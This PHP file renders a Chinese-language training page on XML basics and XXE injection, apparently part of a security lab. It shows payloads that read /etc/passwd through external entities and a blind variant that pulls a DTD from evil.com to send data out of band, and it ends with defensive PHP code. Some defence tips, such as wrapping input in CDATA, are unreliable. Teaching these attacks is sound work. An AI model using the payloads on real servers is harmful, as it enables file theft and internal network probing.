<?php
// XML基础知识和XXE漏洞原理
$module_name = 'XML基础与XXE原理';
$module_icon = '📚';
$module_desc = '讲解XML基础知识和XXE漏洞原理，帮助理解XXE攻击的本质。';

// 页面内容
$content = <<<'EOT'
<div class="card">
        <div class="card-header">
            <h5 class="mb-0">📚 XML基础与XXE原理</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-info">
                <strong>💡 学习目标：</strong><br>
                了解XML基础知识，理解XXE漏洞的原理和攻击方式。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>📄 XML基础知识</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-3">什么是XML？</h5>
                    <p>XML（可扩展标记语言）是一种用于存储和传输数据的标记语言，它具有以下特点：</p>
                    <ul>
                        <li>自我描述性：XML文档包含其自身结构的描述</li>
                        <li>可扩展性：可以自定义标签</li>
                        <li>平台无关：可以在不同系统之间传输</li>
                        <li>人类可读：结构清晰，易于理解</li>
                    </ul>

                    <h5 class="mb-3 mt-4">XML基本结构</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;root&gt;
    &lt;person&gt;
        &lt;name&gt;张三&lt;/name&gt;
        &lt;age&gt;25&lt;/age&gt;
        &lt;city&gt;北京&lt;/city&gt;
    &lt;/person&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-3 mt-4">XML实体</h5>
                    <p>XML实体是XML文档中的一种占位符，用于表示特殊字符或重复内容：</p>
                    <ul>
                        <li><strong>内置实体：</strong>如 &amp;lt; 表示 &lt;，&amp;gt; 表示 &gt;</li>
                        <li><strong>自定义实体：</strong>使用 &lt;!ENTITY&gt; 定义</li>
                        <li><strong>外部实体：</strong>引用外部资源的实体</li>
                    </ul>

                    <pre class="bg-dark text-light p-3 rounded mt-2"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY name "张三"&gt;
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
    &lt;person&gt;
        &lt;name&gt;&amp;name;&lt;/name&gt;
        &lt;data&gt;&amp;file;&lt;/data&gt;
    &lt;/person&gt;
&lt;/root&gt;</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 XXE漏洞原理</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-3">什么是XXE？</h5>
                    <p>XXE（XML External Entity Injection）是一种针对XML解析器的攻击，当XML解析器处理包含外部实体的XML文档时，如果没有正确配置，就可能导致：</p>
                    <ul>
                        <li>读取本地文件</li>
                        <li>进行SSRF攻击</li>
                        <li>执行远程代码</li>
                        <li>拒绝服务攻击</li>
                    </ul>

                    <div class="mb-4">
                        <h5 class="mb-3">🔄 XXE攻击流程</h5>
                        <div class="bg-light p-3 rounded border">
                            <script src="../assets/js/mermaid.min.js"></script>
                            <div class="mermaid">
                                sequenceDiagram
                                    participant Attacker as 攻击者
                                    participant Server as 服务器
                                    
                                    Attacker->>Server: 发送包含外部实体的XML
                                    Server->>Server: 解析XML
                                    Server->>Server: 处理外部实体
                                    Server->>Attacker: 返回实体内容（如文件内容）
                            </div>
                        </div>
                    </div>

                    <h5 class="mb-3">XXE漏洞的危害</h5>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="card bg-danger text-white">
                                <div class="card-body">
                                    <h6>文件读取</h6>
                                    <p>读取服务器上的敏感文件，如/etc/passwd、配置文件等</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="card bg-warning text-white">
                                <div class="card-body">
                                    <h6>SSRF攻击</h6>
                                    <p>访问内部网络资源，探测内网服务和端口</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mt-3">
                            <div class="card bg-success text-white">
                                <div class="card-body">
                                    <h6>远程代码执行</h6>
                                    <p>在某些配置下执行系统命令</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mt-3">
                            <div class="card bg-info text-white">
                                <div class="card-body">
                                    <h6>拒绝服务</h6>
                                    <p>消耗服务器资源，导致服务不可用</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 XXE攻击类型</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="xxeTypes">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingOne">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                                    1. 有回显XXE
                                </button>
                            </h2>
                            <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne" data-bs-parent="#xxeTypes">
                                <div class="accordion-body">
                                    <p>攻击者能够直接看到实体解析的结果，通常用于读取文件内容。</p>
                                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;file;&lt;/data&gt;
&lt;/root&gt;</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingTwo">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                                    2. 盲XXE
                                </button>
                            </h2>
                            <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#xxeTypes">
                                <div class="accordion-body">
                                    <p>攻击者无法直接看到实体解析的结果，需要通过带外通道获取数据。</p>
                                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"&gt;
    %dtd;
    %send;
]&gt;
&lt;root&gt;
    &lt;data&gt;test&lt;/data&gt;
&lt;/root&gt;</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingThree">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                                    3. 基于错误的XXE
                                </button>
                            </h2>
                            <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#xxeTypes">
                                <div class="accordion-body">
                                    <p>通过触发错误信息来获取文件内容，适用于某些解析器配置。</p>
                                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY file SYSTEM "file:///nonexistent"&gt;
]&gt;
&lt;root&gt;
    &lt;data&gt;&amp;file;&lt;/data&gt;
&lt;/root&gt;</code></pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-3">如何防御XXE漏洞？</h5>
                    <ol>
                        <li><strong>禁用外部实体：</strong>在XML解析时禁用外部实体</li>
                        <li><strong>使用libxml_disable_entity_loader：</strong>在PHP中使用libxml_disable_entity_loader(true)</li>
                        <li><strong>使用XMLReader：</strong>使用更安全的XMLReader替代simplexml_load_string</li>
                        <li><strong>输入验证：</strong>对XML输入进行严格的验证</li>
                        <li><strong>使用CDATA：</strong>对于用户输入，使用CDATA包裹</li>
                        <li><strong>更新依赖：</strong>确保使用最新版本的XML解析库</li>
                        <li><strong>网络隔离：</strong>限制服务器的出站网络访问</li>
                        <li><strong>禁用危险协议：</strong>在PHP配置中禁用expect://等危险协议</li>
                    </ol>

                    <h5 class="mb-3 mt-4">PHP中的防御代码</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>// 方法1：禁用外部实体
libxml_disable_entity_loader(true);
$simplexml = simplexml_load_string($xml);

// 方法2：使用XMLReader
$reader = new XMLReader();
$reader->open('data://text/xml,' . $xml);
$reader->setParserProperty(XMLReader::SUBSTITUTE_ENTITIES, false);

// 方法3：使用DOMDocument
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
$dom->loadXML($xml);</code></pre>
                </div>
            </div>
        </div>
    </div>
EOT;

// 包含模板
include '../template/module_template.php';
?>